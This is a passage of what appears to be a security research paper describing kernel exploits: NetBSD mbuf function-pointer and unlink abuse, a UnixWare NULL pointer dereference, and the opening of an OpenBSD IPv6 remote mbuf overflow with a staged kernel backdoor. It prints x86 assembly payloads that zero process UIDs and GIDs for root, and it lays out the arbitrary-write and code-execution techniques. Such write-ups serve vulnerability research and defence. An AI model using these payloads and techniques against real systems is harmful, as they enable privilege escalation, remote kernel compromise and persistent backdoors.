@@ -1,0 +1,246 @@
+        free(m->m_ext.ext_buf, m->m_ext.ext_type); 
+    } 
+    if (dofree) 
+        pool_cache_put(&mbpool_cache, m); 
+} 
+Only the first two and last two lines of that function are of interest provided that M_EXT is the only 
+flag set in m_flags and that m_ext.ext_free is not set. In this scenario the two last lines of the function 
+will put the mbuf into the mbpool_cache. Since it has no business being there it will cause some 
+problems later. The solution for this problem is to reinitialize the mbpool by calling mbinit(). The 
+MCLISREFERENCED and _MCLDEREFERENCE macros are shown below: 
+#define MCLISREFERENCED(m) ((m)->m_ext.ext_nextref != (m)) 
+#define _MCLDEREFERENCE(m) \ 
+    do { \ 
+        (m)->m_ext.ext_nextref->m_ext.ext_prevref = \ 
+        (m)->m_ext.ext_prevref; \ 
+        (m)->m_ext.ext_prevref->m_ext.ext_nextref = \ 
+        (m)->m_ext.ext_nextref; \ 
+    } while (/* CONSTCOND */ 0) 
+MCLISREFERENCED(m) is true if our nextref pointer is not pointing to our own mbuf (i.e. there are 
+more mbufs in the chain). If there are more mbufs in this chain the _MCLDEREFERENCE macro is 
+executed, this macro unlinks the mbuf being freed from the chain by joining the neighboring mbufs.  
+Imagine passing an mbuf to this macro with the ext_nextref pointer set to 0xdeadbeef and the 
+ext_prevref pointer set to 0xbadc0ded. Then the result of the macro being executed can be described by 
+the following two C-statements where NN and PP are the offsets to ext_nextref and ext_prevref within 
+the mbuf respectively: 
+*(unsigned *) (0xbadc0ded+NN) = 0xdeadbeef 
+*(unsigned *) (0xdeadbeef+PP) = 0xbadc0ded 
+This enables an attacker to write a 32-bit value to an arbitrary address. Possible targets to take control 
+over the kernel are, saved return addresses on the stack, function pointers, sysent table etc. 
+Exploring the m_ext_free() function further, this time with the interesting bits highlighted we can see 
+that there is an easier way of exploiting the mbuf.  
+m_ext_free(struct mbuf *m, boolean_t dofree) 
+{ 
+    if (MCLISREFERENCED(m)) { 
+        MCLDEREFERENCE(m); 
+    } else if (m->m_flags & M_CLUSTER) { 
+        pool_cache_put_paddr(m->m_ext.ext_arg, 
+        m->m_ext.ext_buf, m->m_ext.ext_paddr); 
+    } else if (m->m_ext.ext_free) { 
+        (*m->m_ext.ext_free)(dofree ? m : NULL, m->m_ext.ext_buf, 
+        m->m_ext.ext_size, m->m_ext.ext_arg); 
+        dofree = FALSE; 
+    } else { 
+        free(m->m_ext.ext_buf, m->m_ext.ext_type); 
+    } 
+    if (dofree) 
+        pool_cache_put(&mbpool_cache, m); 
+} 
+This time we don't want to exploit the unlinking of an mbuf. So we'll need to get the 
+MCLISREFERENCED macro to evaluate false. This is achieved by referencing our own mbuf with the 
+ext_nextref pointer.  
+The second block of highlighted code shows us a function pointer within the mbuf structure being 
+called if it is set! It is trivial to point m_ext.ext_free variable to a memory location we control and start 
+executing code there when the mbuf is passed to m_free()! Furthermore the variable dofree is set to 
+false in the same code block, which means that no attempt will be made to push the mbuf back into 
+mbpool_cache. This saves us the trouble of cleaning the pool up. 
+Payload 
+My payload is really simple since all I have to do is elevate my privileges locally. The way I do that, is 
+by obtaining a pointer to my process' proc pointer. The proc structure contains a pointer to a structure 
+describing the credentials. Elevating the process privileges is a simple matter of changing the uid/gid 
+values in the credential structure. 
+To obtain the proc pointer I mimic what curlwp does and first get a pointer to the curlwp (current light 
+weight process). A proc pointer can then be obtained from the lwp structure. 
+The curlwp macro along with the curcpu() intel implementation is shown below: 
+#define curlwp          curcpu()->ci_curlwp  
+196 curcpu() 
+197 { 
+198         struct cpu_info *ci; 
+199  
+200         __asm __volatile("movl %%fs:%1, %0" : 
+201             "=r" (ci) : 
+202             "m" 
+203             (*(struct cpu_info * const *)offsetof(struct cpu_info, ci_self))); 
+204         return ci; 
+205 } 
+Using this information we can write a simple payload to elevate the process privileges to root. 
+# first get proc pointer 
+mov eax,[fs:0x4] 
+mov eax,[eax+0x14] 
+mov eax,[eax+0x10] 
+mov eax,[eax+0x8] # get pcred pointer in proc struct 
+mov [eax+0x4],0x0 # set UID to 0 
+ret                         
+Remember mbuf being MFREE'd in a while loop in sbdrop()? We can simply check what the “len” 
+argument is and subtract accordingly to break out of the loop, but I'm lazy and we already got code 
+execution going through the mbuf function pointer when the first mbuf in the chain is freed. So instead 
+of playing nice and breaking out of the while loop like you'd normally do, I execute an “extra” leave 
+instruction in the payload before returning and return to a frame “higher” up. So the new payload 
+becomes: 
+# first get proc pointer 
+mov eax,[fs:0x4] 
+mov eax,[eax+0x14] 
+mov eax,[eax+0x10] 
+mov eax,[eax+0x8] # get pcred pointer in proc struct 
+mov [eax+0x4],0x0 # set UID to 0 
+ret
+Unixware Exploitable NULL Pointer Dereference 
+Vulnerability found and exploit developed by 
+Christer Öberg 
+Introduction 
+I recently discovered an exploitable NULL pointer dereference in the latest UnixWare kernel (7.1.4) 
+using a fuzzer coded up in minutes. At the time of writing, SCO has been informed but no patch has 
+been released. I will therefore explain the bug and exploit as best I can without disclosing too much 
+information. 
+The bug 
+I'm not giving any detail how to trigger the bug, but I will say it is trivial to do and no special privileges 
+are required to do so. The bug is a NULL pointer dereference. Two lines of disassembly of interest are 
+shown below: 
+mov eax, [edi + 0Ch] 
+call dword ptr [eax+4] 
+At this point edi is 0. The address space is shared between kernel and userland so if memory is 
+mmap():ed at address 0x0 the eax register and function call can be controlled.  This leads to arbitrary 
+code execution in kernel context. Memory can be mapped at 0x0 using the MAP_FIXED flag.  
+The Payload 
+I was unable to find any existing UnixWare kernel shellcodes so I had to develop my own. Fortunately 
+this turned out to be trivial to do. I decided to elevate the privileges of a process and execute a root 
+shell. 
+In /usr/include/sys/proc.h I found the proc structure describing a Unixware process. The proc structure 
+got a reference to a structure describing the credentials of the process (found at offset 0x78). The 
+credential structure is found in /usr/include/sys/cred.h. The effective user id is found at offset four, 
+followed by, effective group id and real user and group id.  
+Changing the values user/group id values of the process in this structure of a running kernel will 
+change the credential of the process. To find the credentials structure we first need a struct proc pointer 
+for the process. The easiest way I found to do this is to call the function prfind() with the desired PID as 
+an argument.  
+I found this function reading disassembly listings of various functions, which was pretty stupid to be 
+fair. I should have realized that Solaris and SCO share their SVR4 roots and saved myself some time 
+reading the OpenSolaris source instead. Whats the point of this less that fascinating story? prfind() can 
+be used on Solaris too :)  
+So far so good, but how do you find the prfind() function? Simple! Ask the kernel, there is a system 
+call that will resolve kernel symbols called getksym().  
+Putting everything together, we get this payload: 
+push 0xaaaaaaaa  
+; process id 
+mov 
+eax,0xbbbbbbbb 
+; prfind() 
+call eax 
+mov 
+eax,[eax+0x78] 
+; struct cred  
+mov 
+dword [eax+4], 0   
+; effective uid 
+mov 
+dword [eax+8], 0  
+; effective gid 
+mov 
+dword [eax+12], 0  
+; real uid  
+mov 
+dword [eax+16], 0  
+; real gid  
+add 
+esp,4  
+; fixup stack 
+ret 
+; return  
+Yes I know this is not optimized, nor does it need to be. If you have a problem with that feel free to 
+ruin it, but if you REALLY need the space and the ~3gig that user space provides you with isn't enough 
+- you got other problems. ;)
+OpenBSD IPv6 Remote mbuf Overflow 
+Vulnerability researched and exploit developed by 
+Claes Nyberg 
+Introduction 
+This bug was found by Alfredo Ortega which also released a PoC that executed a breakpoint, but no 
+working exploit. The advisory can be found at [1]. 
+Targets 
+OpenBSD 4.1 (prior to Feb. 26th, 2006), 4.0, 3.9, 3.8, 3.6 and 3.1 was tested and reported as vulnerable 
+in the advisory from Core. I found the following default installations of OpenBSD (x86) releases to be 
+vulnerable: 4.0, 3.9, 3.8, 3.7, 3.6, 3.5, 3.4, 3.3, 3.2 and 3.1. Earlier releases supporting IPv6 are likely to 
+be vulnerable as well. The code has changed between 3.6 and 3.7 so a different technique is required 
+for targeting versions <= 3.6. I focused on 3.7, 3.8, 3.9 and 4.0 in my exploit. 
+Taking control of execution flow 
+By sending fragmented ICMPv6 packets it is possible to overwrite a complete mbuf structure. 
+From /usr/src/sys/sys/mbuf.h:  
+struct mbuf { 
+    struct  m_hdr m_hdr; 
+    union { 
+        struct { 
+            struct  pkthdr MH_pkthdr;   /* M_PKTHDR set */ 
+            union { 
+                struct  m_ext MH_ext;   /* M_EXT set */ 
+                char    MH_databuf[MHLEN]; 
+            } MH_dat; 
+        } MH; 
+        char    M_databuf[MLEN];        /* !M_PKTHDR, !M_EXT */ 
+    } M_dat; 
+}; 
+/* description of external storage mapped into mbuf, valid if M_EXT set */ 
+struct m_ext { 
+    caddr_t ext_buf;        /* start of buffer */ 
+                    /* free routine if not the usual */ 
+    void    (*ext_free)(caddr_t, u_int, void *); 
+    void    *ext_arg;       /* argument for ext_free */ 
+    u_int   ext_size;       /* size of buffer, for ext_free */ 
+    int ext_type; 
+    struct mbuf *ext_nextref; 
+    struct mbuf *ext_prevref; 
+#ifdef DEBUG 
+    const char *ext_ofile; 
+    const char *ext_nfile; 
+    int ext_oline; 
+    int ext_nline; 
+#endif 
+}; 
+There are multiple possible ways of gaining control of the execution flow when controlling the whole 
+mbuf structure. When the mbuf flags are set to M_EXT (1), we can abuse the MH_ext structure in 
+the following ways: 
+• Overwrite the ext_free function pointer to jump anywhere we want 
+• Set ext_free=NULL and set ext_buf to an address which is  free'd by free(9) 
+• Set ext_nextref and ext_prevref to write a 32 bit value when unlinked 
+At this point it seems like overwriting the ext_free function pointer inside the m_ext structure in the 
+mbuf is the most reliable way. The sad part is that we need to have a hard coded address to reach 
+controlled data.  
+The registers ecx, ebx and esi points to the start of the overwritten mbuf and can be used to jump to 
+controlled data (start of the overwritten mbuf). Unfortunately, a universal address which points to any 
+jmp/call instruction for these registers have not been found. 
+Register values after jmp to start of controlled mbuf: 
+0xd611db03 in ?? () 
+(gdb) info registers 
+eax            0xd02022f0       -803200272 
+ecx            0xd611db00       -703472896 
+edx            0x81     129 
+ebx            0xd611db00       -703472896 
+esp            0xd088d9ea       0xd088d9ea 
+ebp            0xd088da16       0xd088da16 
+esi            0xd611db00       -703472896 
+edi            0x30     48 
+eip            0xd611db03       0xd611db03 
+From here we then make a jump backwards to stage 1 which is located directly before the overwritten 
+mbuf. 
+The payload 
+The payload is divided into three parts: 
+• Stage 1 - Installs the backdoor 
+• Stage 2 – The backdoor, icmp6_input wrapper 
+• Stage 3 – Backdoor command(s) 
+Stage 1 
+When stage 1 is executed it starts by resetting some values in the overwritten mbuf (marking it as free, 
+clearing flags etc), just to set things right and avoid any possible crash later on. The next step is to 
+search for stage 2.  
+Stage 2 is injected into the memory as data in a valid ICMPv6 packet, and prepended with a magic 
+value (0xbadc0ded) to simplify searching. The naive approach for finding stage 2 is to search the 
+memory for the magic value. but as it turns out there is an universal offset for finding the mbuf chain 
+for the previous packet on the stack from the call to m_freem() that is used to gain control of the 
+execution flow: %esp – 0x6c. 
